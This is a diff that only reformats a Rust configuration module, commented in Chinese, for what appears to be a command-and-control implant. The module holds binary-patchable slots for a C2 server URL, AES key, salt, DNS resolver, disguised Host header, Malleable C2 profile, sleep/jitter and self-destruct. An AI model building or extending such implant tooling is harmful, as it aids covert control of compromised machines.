@@ -5,7 +5,7 @@
 use log::{debug, warn};
 
 /// Builder Service 动态注入占位符
-/// 
+///
 /// 这些常量会在编译时被 Builder Service 替换为实际的值。
 /// 构建服务将替换这些字符串。
 pub const AES_KEY: &str = "REPLACE_ME_AES_KEY";
@@ -16,7 +16,8 @@ pub const JITTER: &str = "REPLACE_ME_JITTER";
 
 ///服务器 URL 模板 (64 字节)
 #[used]
-pub static SERVER_URL_TEMPLATE: [u8; 64] = *b"SYSTEM_CONFIG_DATA_SERVICE_PROVIDER_MAPPING_ENDPOINT_SLOT_000001";
+pub static SERVER_URL_TEMPLATE: [u8; 64] =
+    *b"SYSTEM_CONFIG_DATA_SERVICE_PROVIDER_MAPPING_ENDPOINT_SLOT_000001";
 
 /// AES-256 密钥模板 (32 字节)
 #[used]
@@ -39,7 +40,8 @@ pub static SLEEP_TIME_TEMPLATE: [u8; 16] = *b"ST_DATA_INT_0000";
 
 /// DNS 解析器模板 (64 字节)
 #[used]
-pub static DNS_RESOLVER_TEMPLATE: [u8; 64] = *b"SYSTEM_NETWORK_STUB_RESOLVER_64_PLACEHOLDER_XXXXXXXXXXXXXXXXXXXX";
+pub static DNS_RESOLVER_TEMPLATE: [u8; 64] =
+    *b"SYSTEM_NETWORK_STUB_RESOLVER_64_PLACEHOLDER_XXXXXXXXXXXXXXXXXXXX";
 
 /// 加密盐模板 (32 字节)
 #[used]
@@ -59,7 +61,8 @@ pub static UA_TEMPLATE: [u8; 128] = *b"Mozilla/5.0 (Windows NT 10.0; Win64; x64)
 
 /// Host 域名伪装模板 (64 字节)
 #[used]
-pub static HOST_TEMPLATE: [u8; 64] = *b"SYSTEM_CONFIG_DATA_HOST_MAPPING_PLACEHOLDER_XXXXXXXXXXXXXXXXXXXX";
+pub static HOST_TEMPLATE: [u8; 64] =
+    *b"SYSTEM_CONFIG_DATA_HOST_MAPPING_PLACEHOLDER_XXXXXXXXXXXXXXXXXXXX";
 
 /// Malleable C2 Profile 名称模板 (32 字节)
 #[used]
@@ -72,7 +75,6 @@ pub fn get_default_debug_url() -> String {
 
 /// 默认心跳间隔（秒）
 const DEFAULT_HEARTBEAT_INTERVAL: u64 = 10;
-
 
 /// 获取是否开启自毁
 pub fn get_auto_destruct() -> bool {
@@ -88,9 +90,8 @@ pub fn get_sleep_time() -> u64 {
         .unwrap_or(0)
 }
 
-
 /// 获取服务器 URL (核心修复：移除强制协议检查)
-/// 
+///
 /// 该函数会检查 `SERVER_URL_TEMPLATE` 数组：
 /// - 如果包含 "CONFIG_ID"，说明尚未修补，返回默认调试地址
 /// - 否则，解析并返回实际的 URL（去除 null 字节和填充字符）
@@ -113,19 +114,22 @@ pub fn get_server_url() -> String {
             .trim_matches('_')
             .trim()
             .to_string();
-        
+
         if !url.is_empty() {
             debug!("[*] 使用二进制补丁地址: {}", url);
             return url;
         }
     }
-    
-    debug!("[*] 未检测到补丁地址，使用本地默认值: {}", get_default_debug_url());
+
+    debug!(
+        "[*] 未检测到补丁地址，使用本地默认值: {}",
+        get_default_debug_url()
+    );
     get_default_debug_url()
 }
 
 /// 验证服务器 URL 格式
-/// 
+///
 /// 仅用于 WebSocket 模式下的再次确认，不用于 get_server_url 的初步筛选。
 pub fn validate_server_url(url: &str) -> bool {
     url.starts_with("ws://")
@@ -150,7 +154,10 @@ pub fn get_aes_key_base() -> Vec<u8> {
         if base_key.is_empty() {
             base_key = key_str.as_bytes().to_vec();
         }
-        debug!("[+] Loaded base key from source static patch (len: {})", base_key.len());
+        debug!(
+            "[+] Loaded base key from source static patch (len: {})",
+            base_key.len()
+        );
     }
 
     // 2. 二进制动态修补
@@ -158,7 +165,10 @@ pub fn get_aes_key_base() -> Vec<u8> {
         let placeholder_check = String::from_utf8_lossy(&AES_KEY_TEMPLATE);
         if !placeholder_check.contains("DATA_ENCRYPT") {
             base_key = AES_KEY_TEMPLATE.to_vec();
-            debug!("[+] Loaded base key from binary dynamic patch (len: {})", base_key.len());
+            debug!(
+                "[+] Loaded base key from binary dynamic patch (len: {})",
+                base_key.len()
+            );
         }
     }
 
@@ -202,7 +212,7 @@ pub fn get_crypto_config_info() -> CryptoConfigInfo {
     let key = get_aes_key();
     let is_patched = !String::from_utf8_lossy(&AES_KEY_TEMPLATE).contains("DATA_ENCRYPT");
     let is_valid = validate_aes_key(&key);
-    
+
     CryptoConfigInfo {
         encrypt_mode: ENCRYPT_MODE.to_string(),
         key_length: key.len(),
@@ -228,14 +238,17 @@ pub fn get_heartbeat_interval() -> u64 {
         .last()
         .unwrap_or("010")
         .trim_matches('\0');
-    
+
     match interval_part.parse::<u64>() {
         Ok(interval) if interval > 0 && interval <= 3600 => {
             debug!("[*] 当前心跳频率: {} 秒", interval);
             interval
         }
         Ok(interval) => {
-            warn!("Heartbeat interval {} out of range. Using default.", interval);
+            warn!(
+                "Heartbeat interval {} out of range. Using default.",
+                interval
+            );
             DEFAULT_HEARTBEAT_INTERVAL
         }
         Err(_) => {
@@ -301,7 +314,11 @@ pub fn get_host_header() -> Option<String> {
         .trim_matches('_')
         .trim()
         .to_string();
-    if val.is_empty() { None } else { Some(val) }
+    if val.is_empty() {
+        None
+    } else {
+        Some(val)
+    }
 }
 
 /// 获取 DNS 解析器地址
@@ -310,7 +327,7 @@ pub fn get_dns_resolver() -> Option<String> {
     if template_str.contains("STUB_RESOLVER") {
         return None;
     }
-    
+
     let resolver = template_str
         .trim_matches('\0')
         .trim_matches(char::from(0))
@@ -318,16 +335,16 @@ pub fn get_dns_resolver() -> Option<String> {
         .trim_matches('_')
         .trim()
         .to_string();
-    
+
     if resolver.is_empty() {
         return None;
     }
-    
+
     if !resolver.contains(':') {
         warn!("Invalid DNS resolver format '{}'. Using default", resolver);
         return None;
     }
-    
+
     debug!("[*] 使用补丁 DNS 服务器: {}", resolver);
     Some(resolver)
 }
@@ -340,8 +357,14 @@ pub fn get_dns_resolver() -> Option<String> {
 pub fn get_encryption_salt() -> Vec<u8> {
     // 1. 源码静态替换
     if ENCRYPTION_SALT != "REPLACE_ME_SALT" {
-        let salt_clean = ENCRYPTION_SALT.trim().trim_matches('\0').trim_matches(char::from(0));
-        debug!("[+] Using statically replaced Salt (len {})", salt_clean.len());
+        let salt_clean = ENCRYPTION_SALT
+            .trim()
+            .trim_matches('\0')
+            .trim_matches(char::from(0));
+        debug!(
+            "[+] Using statically replaced Salt (len {})",
+            salt_clean.len()
+        );
         let mut salt_vec = salt_clean.as_bytes().to_vec();
         salt_vec.resize(32, 0);
         if salt_vec.iter().all(|&b| b == 0) {
@@ -365,7 +388,10 @@ pub fn get_encryption_salt() -> Vec<u8> {
 pub fn get_packet_obfuscation_mode() -> String {
     // 1. 源码静态替换
     if OBFUSCATION_MODE != "REPLACE_ME_OBF" && !OBFUSCATION_MODE.is_empty() {
-        debug!("[+] Using statically replaced Obfuscation: {}", OBFUSCATION_MODE);
+        debug!(
+            "[+] Using statically replaced Obfuscation: {}",
+            OBFUSCATION_MODE
+        );
         return OBFUSCATION_MODE.to_string();
     }
 
@@ -386,20 +412,22 @@ pub fn get_packet_obfuscation_mode() -> String {
 /// 获取配置信息
 pub fn get_config_info() -> ConfigInfo {
     let url = get_server_url();
-    let is_patched = !String::from_utf8_lossy(&SERVER_URL_TEMPLATE).contains("SERVICE_PROVIDER_MAPPING");
+    let is_patched =
+        !String::from_utf8_lossy(&SERVER_URL_TEMPLATE).contains("SERVICE_PROVIDER_MAPPING");
     // 只有在 WS 模式下，validate_server_url 的结果才重要
     let is_valid = if url.starts_with("ws") {
         validate_server_url(&url)
     } else {
         true // DNS 域名默认视为有效
     };
-    
+
     ConfigInfo {
         server_url: url,
         is_patched,
         is_valid,
         template_length: SERVER_URL_TEMPLATE.len(),
-        encryption_salt_set: !String::from_utf8_lossy(&ENCRYPTION_SALT_TEMPLATE).contains("KDF_SALT"),
+        encryption_salt_set: !String::from_utf8_lossy(&ENCRYPTION_SALT_TEMPLATE)
+            .contains("KDF_SALT"),
         obfuscation_mode: get_packet_obfuscation_mode(),
     }
 }
@@ -422,7 +450,7 @@ mod tests {
     #[test]
     fn test_template_lengths() {
         assert_eq!(SERVER_URL_TEMPLATE.len(), 64);
-        assert_eq!(AES_KEY_TEMPLATE.len(), 32); 
+        assert_eq!(AES_KEY_TEMPLATE.len(), 32);
         assert_eq!(DNS_RESOLVER_TEMPLATE.len(), 64);
         assert_eq!(ENCRYPTION_SALT_TEMPLATE.len(), 32);
     }
